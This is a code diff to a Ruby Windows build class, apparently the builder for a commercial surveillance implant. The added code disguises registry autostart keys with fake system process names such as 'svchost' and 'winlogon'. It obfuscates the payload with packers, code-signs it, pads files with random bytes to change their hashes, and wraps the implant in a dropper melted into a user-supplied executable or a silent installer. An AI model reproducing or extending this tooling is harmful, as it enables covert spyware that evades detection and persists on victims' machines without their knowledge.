@@ -58,6 +58,21 @@ class BuildWindows < Build
       end
     end
 
+    # patching for the registry key name
+    patch_file(:file => 'core') do |content|
+      begin
+        # the new registry key
+        content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
+        # and the old one (previous method)
+        core = scramble_name(@factory.seed, 3)
+        dir = scramble_name(core[0..7], 7)
+        reg = '*' + scramble_name(dir, 1)[1..-1]
+        content.binary_patch 'IaspdPDuFMfnm_apggLLL712j', reg.ljust(25, "\x00")
+      rescue
+        raise "Registry key marker not found"
+      end
+    end
+
     # we have an exception here, the core64 must be patched only with the signature and function name
 
     # patching for the function name
@@ -74,18 +89,36 @@ class BuildWindows < Build
       begin
         sign = ::Signature.where({scope: 'agent'}).first
         signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
-        content.binary_patch 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
+
+        marker = 'ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ'
+        magic = LicenseManager.instance.limits[:magic] + marker.slice(8..-1)
+
+        content.binary_patch marker, signature
       rescue
         raise "Signature marker not found"
       end
     end
+
+    # patching for the registry key name
+    patch_file(:file => 'core64') do |content|
+      begin
+        # the new registry key
+        content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
+      rescue
+        raise "Registry key marker not found"
+      end
+    end
+
+    # code obfuscator
+    CrossPlatform.exec path('packer32'), "#{path('core')}"
+    CrossPlatform.exec path('packer64'), "#{path('core64')}"
 
     # signature for the patched code
     CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core')}" if to_be_signed?(params)
     CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core64')}" if to_be_signed?(params)
 
     # add random bytes to codec, rapi and sqlite
-    add_random(path('codec'))
+    CrossPlatform.exec path('packer32'), "#{path('codec')}"
     add_random(path('rapi'))
     add_random(path('sqlite'))
 
@@ -102,10 +135,11 @@ class BuildWindows < Build
     driver = scramble_name(config, 4)
     driver64 = scramble_name(config, 16)
     core64 = scramble_name(config, 15)
-    reg = '*' + scramble_name(dir, 1)[1..-1]
+    oldreg = '*' + scramble_name(dir, 1)[1..-1]
+    reg = reg_start_key(@factory.confkey)
 
     @scrambled = {core: core, core64: core64, driver: driver, driver64: driver64,
-                  dir: dir, reg: reg, config: config, codec: codec }
+                  dir: dir, reg: reg, oldreg: oldreg, config: config, codec: codec }
 
     # call the super which will actually do the renaming
     # starting from @outputs and @scrambled
@@ -124,63 +158,51 @@ class BuildWindows < Build
     executable = path('default')
 
     # by default build the 64bit support
-    bit64 = (params['bit64'] == false) ? false : true
-    codec = (params['codec'] == false) ? false : true
+    @bit64 = (params['bit64'] == false) ? false : true
+    @codec = (params['codec'] == false) ? false : true
 
     # use the user-provided file to melt with
     if params['input']
       FileUtils.mv Config.instance.temp(params['input']), path('input')
       executable = path('input')
-    end
-
-    if params['cooked'] == true
-      @cooked = true
-      key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase
-
-      # write the ini file
-      File.open(path('RCS.ini'), 'w') do |f|
-        f.puts "[RCS]"
-        f.puts "HUID=#{@factory.ident}"
-        f.puts "HCORE=#{@scrambled[:core]}"
-        f.puts "HCONF=#{@scrambled[:config]}"
-        f.puts "CODEC=#{@scrambled[:codec]}"
-        f.puts "HDRV=#{@scrambled[:driver]}"
-        f.puts "DLL64=#{@scrambled[:core64]}"
-        f.puts "DRIVER64=#{@scrambled[:driver64]}"
-        f.puts "HDIR=#{@scrambled[:dir]}"
-        f.puts "HREG=#{@scrambled[:reg]}"
-        f.puts "HSYS=ndisk.sys"
-        f.puts "HKEY=#{key}"
-        f.puts "MANIFEST=" + ((params['admin'] == true) ? 'yes' : 'no')
-        f.puts "FUNC=" + @funcname
-      end
-
-      cook_param = '-C -R ' + path('') + ' -O ' + path('output')
-      cook_param += " -d #{path('demo_image')}" if @demo
-
-      CrossPlatform.exec path('cooker'), cook_param
-
-    else
 
       CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
-                                          (bit64 ? path(@scrambled[:core64]) : 'null') +' '+
+                                          (@bit64 ? path(@scrambled[:core64]) : 'null') +' '+
                                           path(@scrambled[:config])+' '+
 
                                           # TODO: driver removal
                                           'null ' +
                                           'null ' +
                                           #path(@scrambled[:driver])+' '+
-                                          #(bit64 ? path(@scrambled[:driver64]) : 'null') +' '+
+                                          #(@bit64 ? path(@scrambled[:driver64]) : 'null') +' '+
 
-                                          (codec ? path(@scrambled[:codec]) : 'null') +' '+
+                                          (@codec ? path(@scrambled[:codec]) : 'null') +' '+
                                           @scrambled[:dir]+' '+
                                           manifest +' '+
                                           @funcname +' '+
                                           (@demo ? path('demo_image') : 'null') +' '+
                                           executable + ' ' +
                                           path('output')
+    else
+      # we have to create a silent installer
+      cook(params)
+      File.exist? path('output') || raise("output file not created")
+
+      cooked = File.open(path('output'), 'rb') {|f| f.read}
+
+      silent_file = params['admin'] == true ? 'silent_admin' : 'silent'
+      File.open(path(silent_file), 'ab+') {|f| f.write cooked}
+
+      FileUtils.rm_rf path('output')
+      FileUtils.cp path(silent_file), path('output')
     end
-    
+
+    # this is a build for the NI
+    if params['cooked'] == true
+      @cooked = true
+      cook(params)
+    end
+
     File.exist? path('output') || raise("output file not created")
 
     trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"
@@ -208,6 +230,18 @@ class BuildWindows < Build
     # this is the only file we need to output after this point
     @outputs = ['output.zip']
 
+  end
+
+  def unique(core)
+    Zip::ZipFile.open(core) do |z|
+      core_content = z.file.open('core', "rb") { |f| f.read }
+      add_magic(core_content)
+      File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
+    end
+
+    # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
+    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core')}"
+    FileUtils.rm_rf Config.instance.temp('core')
   end
 
   def ghost(params)
@@ -239,6 +273,37 @@ class BuildWindows < Build
 
   private
 
+  def cook(params)
+    key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase
+
+    # write the ini file
+    File.open(path('RCS.ini'), 'w') do |f|
+      f.puts "[RCS]"
+      f.puts "HUID=#{@factory.ident}"
+      f.puts "HCORE=#{@scrambled[:core]}"
+      f.puts "HCONF=#{@scrambled[:config]}"
+      f.puts "CODEC=#{@scrambled[:codec]}" if @codec
+      f.puts "DLL64=#{@scrambled[:core64]}" if @bit64
+
+      # TODO: driver removal (just comment them here)
+      #f.puts "HDRV=#{@scrambled[:driver]}"
+      #f.puts "DRIVER64=#{@scrambled[:driver64]}"
+
+      f.puts "HDIR=#{@scrambled[:dir]}"
+      f.puts "HREG=#{@scrambled[:reg]}"
+      f.puts "HSYS=ndisk.sys"
+      f.puts "HKEY=#{key}"
+      f.puts "MANIFEST=" + (params['admin'] == true ? 'yes' : 'no')
+      f.puts "FUNC=" + @funcname
+      f.puts "INSTALLER=" + (@cooked ? 'no' : 'yes')
+    end
+
+    cook_param = '-C -R ' + path('') + ' -O ' + path('output')
+    cook_param += " -d #{path('demo_image')}" if @demo
+
+    CrossPlatform.exec path('cooker'), cook_param
+  end
+
   def add_random(file)
     File.open(file, 'ab+') {|f| f.write SecureRandom.random_bytes(16)}
   end
@@ -259,6 +324,15 @@ class BuildWindows < Build
     end
 
     do_signature
+  end
+
+  def reg_start_key(seed)
+    fakever = (seed[2].ord % 11).to_s + "." + seed.slice(0..2).unpack('S').first.to_s
+
+    fake_names = ['wmiprvse', 'lssas', 'dllhost', 'winlogon', 'svchost', 'MSInst', 'WinIME',
+                  'RSSFeed', 'IconDB', 'MSCache', 'IEPrefs', 'EVTvwr', 'TServer', 'SMBAuth',
+                  'DRM', 'Recovery', 'Registry', 'Cookies', 'MSVault', 'MSDiag', 'MSHelp']
+    fake_names[seed.ord % fake_names.size] + " " + fakever
   end
 
 end
